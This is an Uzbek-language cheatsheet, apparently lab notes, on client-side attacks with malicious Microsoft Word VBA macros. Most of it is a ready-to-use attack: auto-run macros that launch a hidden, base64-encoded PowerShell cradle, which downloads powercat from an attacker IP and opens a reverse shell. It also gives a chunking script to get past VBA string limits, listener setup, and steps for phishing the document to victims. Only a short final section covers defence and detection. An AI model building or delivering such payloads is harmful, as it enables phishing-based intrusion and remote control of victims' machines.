# 📄 Microsoft Word Macros (VBA) orqali Client-Side Hujumlar — Cheatsheet

Ushbu qo'llanmada Microsoft Word hujjatlariga zararli makroslar (VBA - Visual Basic for Applications) joylash, foydalanuvchi hujjatni ochganda avtomatik ravishda PowerShell yordamida **PowerCat** orqali teskari ulanish (Reverse Shell) olish va VBA ichidagi texnik cheklovlarni chetlab o'tish bosqichlari batafsil bayon etilgan.

---

## 📌 Mundarija
1. [Hujum Konsepsiyasi va Makroslar haqida](#1-hujum-konsepsiyasi-va-makroslar-haqida)
2. [Fayl Formatlari (.doc vs .docm vs .docx)](#2-fayl-formatlari-doc-vs-docm-vs-docx)
3. [Word'da Makros Yaratish Qadamlari](#3-wordda-makros-yaratish-qadamlari)
4. [VBA Asoslari va Buyruq Bajarish (Wscript.Shell)](#4-vba-asoslari-va-buyruq-bajarish-wscriptshell)
5. [Avtomatik Ishga Tushirish (AutoOpen & Document_Open)](#5-avtomatik-ishga-tushirish-autoopen--document_open)
6. [PowerShell Download Cradle va Reverse Shell](#6-powershell-download-cradle-va-reverse-shell)
7. [Base64 (UTF-16LE) Kodlash](#7-base64-utf-16le-kodlash)
8. [VBA 255 Ta Belgi Cheklovi va Python Skript](#8-vba-255-ta-belgi-cheklovi-va-python-skript)
9. [To'liq VBA Makros Koding Kodi (Final Payload)](#9-toliq-vba-makros-kodi-final-payload)
10. [Hujumni Amalga Oshirish Bosqichlari (Attack Workflow)](#10-hujumni-amalga-oshirish-bosqichlari-attack-workflow)
11. [Himoyalanish va Aniqlash (Defense & Detection)](#11-himoyalanish-va-aniqlash-defense--detection)

---

## 1. Hujum Konsepsiyasi va Makroslar haqida

* **Makros (Macro)** — bu Microsoft Office ilovalarida (Word, Excel) takrorlanuvchi vazifalarni avtomatlashtirish uchun yoziladigan buyruqlar va instruksiyalar to'plami (VBA tilida yoziladi).
* **Client-Side Attack vektori:** Tashkilotlar ichki tarmoqlariga kirish (Initial Foothold) uchun ijtimoiy muhandislik (phishing) orqali xodimga makrosli Word hujjati yuboriladi. Agar foydalanuvchi "Enable Content" (Kontentni yoqish) tugmasini bossa, hujjat orqasida yashiringan kod ishga tushadi va hujumchiga reverse shell beradi.

---

## 2. Fayl Formatlari (.doc vs .docm vs .docx)

Hujjatni to'g'ri formatda saqlash juda muhim:

| Format | Tavsif | Makrosni saqlay oladimi? |
| :--- | :--- | :---: |
| **`.doc`** | Word 97–2003 formati (Binary). Xavfsizlik filtrlari kamroq e'tibor qaratadi. | ✅ **Ha (Persistent)** |
| **`.docm`** | Word Macro-Enabled Document formati (OpenXML). Zamonaviy Word uchun mo'ljallangan. | ✅ **Ha (Persistent)** |
| **`.docx`** | Standart Word hujjati. Xavfsizlik maqsadida makroslarni to'g'ridan-to'g'ri ichida saqlay olmaydi. | ❌ **Yo'q** |

> [!WARNING]
> Faylni saqlayotganda, albatta **Word 97-2003 Document (`.doc`)** yoki **Word Macro-Enabled Document (`.docm`)** formatini tanlang! Standart `.docx` formatida saqlasangiz, yozgan makroslaringiz o'chib ketadi.

---

## 3. Word'da Makros Yaratish Qadamlari

1. Bo'sh Word hujjatini oching va uni `fayl_nomi.doc` sifatida saqlang.
2. Yuqori menyudan **View** (Вид) bo'limiga o'ting.
3. O'ng tomondan **Macros** (Макросы) tugmasini bosing (yoki `Alt + F8`).
4. **Macro Name** qatoriga makros nomini kiriting (masalan: `MyMacro`).
5. **Macros in** menyusidan hujjat nomini (masalan: `fayl_nomi (document)`) tanlang (makros faqat shu hujjatga saqlanishi uchun).
6. **Create** tugmasini bosing.
7. Natijada **Microsoft Visual Basic for Applications (VBA)** muharriri oynasi ochiladi.

---

## 4. VBA Asoslari va Buyruq Bajarish (Wscript.Shell)

VBA protsedurasi `Sub ProtseduraNomi()` bilan boshlanadi va `End Sub` bilan tugaydi. Izohlar (comments) esa bir tirnoq (`'`) bilan yoziladi:

```vb
Sub MyMacro()
    ' Bu yerda kod bajariladi
End Sub
```

Tizim buyruqlarini (OS commands) bajarish uchun Windows Script Host Shell obyekti (`Wscript.Shell`) yaratiladi va uning `Run` metodi chaqiriladi:

```vb
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

---

## 5. Avtomatik Ishga Tushirish (AutoOpen & Document_Open)

Hujjat ochilganda foydalanuvchi menyudan makrosni qo'lda izlab ishga tushirmaydi. Shuning uchun kod **avtomatik tarzda** bajarilishi lozim.

Word ilovasida ikkita asosiy hodisa (hook) mavjud:
1. `AutoOpen()` — Word dasturi orqali hujjat ochilganda ishga tushadi.
2. `Document_Open()` — Hujjat obyekti yuklanganda chaqiriladi.

Turli ochilish usullarini (masalan, fayl ustiga ikki marta bosganda yoki Word ichidan ochganda) to'liq qamrab olish uchun ikkalasidan ham foydalanish tavsiya etiladi:

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

---

## 6. PowerShell Download Cradle va Reverse Shell

Oddiy powershell oynasini ochish o'rniga, to'liq reverse shell olish uchun **PowerCat** (PowerShell uchun Netcat) skriptidan foydalanamiz.

### PowerShell bir qatorlik buyrug'i (Cradle):
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>/powercat.ps1');powercat -c <KALI_IP> -p <KALI_PORT> -e powershell
```

Bu buyruq:
1. Kali Linux'dagi web serverdan `powercat.ps1` skriptini xotiraga yuklaydi (`IEX`).
2. Kali'dagi tinglovchi (listener) portiga ulanib, `powershell.exe` seansini taqdim etadi.

---

## 7. Base64 (UTF-16LE) Kodlash

PowerShell buyruqlarida qo'shtirnoqlar, qavslar va maxsus belgilar VBA sintaksisi yoki buyruqlar satrida muammo keltirib chiqarmasligi uchun butun buyruqni **UTF-16LE / Unicode** formatida Base64 bilan kodlash zarur.

### Linux (Bash) orqali kodlash:
```bash
echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.201/powercat.ps1');powercat -c 192.168.45.201 -p 4444 -e powershell" | iconv -t utf-16le | base64 -w 0
```

### Python orqali kodlash:
```python
import base64

cmd = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.201/powercat.ps1');powercat -c 192.168.45.201 -p 4444 -e powershell"
encoded = base64.b64encode(cmd.encode("utf-16le")).decode()
print(encoded)
```

Natijada hosil bo'lgan string quyidagicha ishga tushiriladi:
```cmd
powershell.exe -nop -w hidden -enc <BASE64_PAYLOAD>
```
* `-nop` (`-NoProfile`): Foydalanuvchi profilini yuklamaydi.
* `-w hidden` (`-WindowStyle Hidden`): PowerShell oynasini yashirin holda ochadi.
* `-enc` (`-EncodedCommand`): Base64 formatidagi buyruqni bajaradi.

---

## 8. VBA 255 Ta Belgi Cheklovi va Python Skript

> [!IMPORTANT]
> **VBA Cheklovi:** VBA qat'iy string (literal string - `"..."`) uchun maksimal **255 ta belgi** qabul qiladi. Agar bitta qatorda 255 tadan ortiq belgi yozilsa, Word sintaksis xatoligi beradi.

### Yechim:
O'zgaruvchi (`Dim Str As String`) e'lon qilinadi va umumiy buyruq kichikroq bo'laklarga (masalan, 50 ta belgidan) bo'linib, o'zgaruvchiga ketma-ket birlashtirib boriladi (`Str = Str + "..."`).

### Bo'laklarga ajratuvchi Python skripti (`split_chunks.py`):
```python
#!/usr/bin/env python3

# PowerShell to'liq buyrug'i
payload = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC..."

chunk_size = 50

print('    Dim Str As String')
for i in range(0, len(payload), chunk_size):
    chunk = payload[i:i + chunk_size]
    print(f'    Str = Str + "{chunk}"')
print('    CreateObject("Wscript.Shell").Run Str')
```

---

## 9. To'liq VBA Makros Kodi (Final Payload)

Word hujjatiga kiritiladigan tayyor makros kodi:

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
    Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    Str = Str + "nAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAu"
    Str = Str + "ADEANgA4AC4ANAA1AC4AMgAwADEALwBwAG8AdwBlAHIAYwBhAH"
    Str = Str + "QALgBwAHMAMQAnACkAOwBwAG8AdwBlAHIAYwBhAHQIAAtAGMA"
    Str = Str + "IAAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAwADEAIAAtAHAAIA"
    Str = Str + "A0ADQANAA0ACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

---

## 10. Hujumni Amalga Oshirish Bosqichlari (Attack Workflow)

### 1-qadam: Kali Linux'da `powercat.ps1` skriptini tayyorlash
PowerCat skripti joylashgan papkaga o'ting:
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
# yoki GitHub'dan yuklab olish:
# wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
```

### 2-qadam: Web serverni ishga tushirish (Payload yetkazish)
```bash
python3 -m http.server 80
```

### 3-qadam: Netcat Listener ochish (Reverse shell qabul qilish)
```bash
nc -nvlp 4444
```

### 4-qadam: Word hujjatini saqlash va nishonga yuborish
* Makros kodi kiritilgandan so'ng hujjat `.doc` formatida saqlanadi.
* Hujjat elektron pochta yoki fayl yuklash shakllari (masalan, helpdesk chiptalari) orqali yuboriladi.

### 5-qadam: Foydalanuvchi ochishi va Shell olish
* Jabrlanuvchi faylni ochib, sarlavha ostidagi **"Enable Content"** tugmasini bosadi.
* Web serveringizda `GET /powercat.ps1` so'rovi ko'rinadi.
* Netcat tinglovchingizda to'liq `Windows PowerShell` konsoli ochiladi:
```text
listening on [any] 4444 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.50.196] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\offsec\Documents>
```

> [!NOTE]
> Agar foydalanuvchi bir marta "Enable Content" tugmasini bossa, Office ushbu faylni eslab qoladi va keyingi ochilishlarda ogohlantirishsiz to'g'ridan-to'g'ri makrosni bajaradi (fayl nomi yoki yo'li o'zgarmasa).

---

## 11. Himoyalanish va Aniqlash (Defense & Detection)

Tashkilotlarni ushbu turdagi hujumlardan himoya qilish choralari:

1. **Mark of the Web (MotW):** Zamonaviy Windows/Office versiyalari internetdan (elektron pochta, brauzer) yuklab olingan hujjatlarda makroslarni sukut bo'yicha bloklaydi.
2. **Attack Surface Reduction (ASR) qoidalari:**
   * *"Block Office applications from creating child processes"* — Office ilovalari (Word, Excel) tomonidan `powershell.exe`, `cmd.exe` kabi bolalar jarayonlari yaratilishini to'xtatadi.
   * *"Block Win32 API calls from Office macros"*.
3. **GPO (Group Policy):** Makroslar talab qilinmaydigan bo'limlarda Office makroslarini to'liq o'chirib qo'yish (`Disable all macros without notification`).
4. **EDR / Antivirus monitoring:** `winword.exe` yoki `excel.exe` ning `powershell.exe` yoki `cmd.exe` ni ishga tushirish hodisalarini (Process Creation Event ID 4688 / Sysmon Event ID 1) shubhali deb belgilash va darhol to'xtatish.
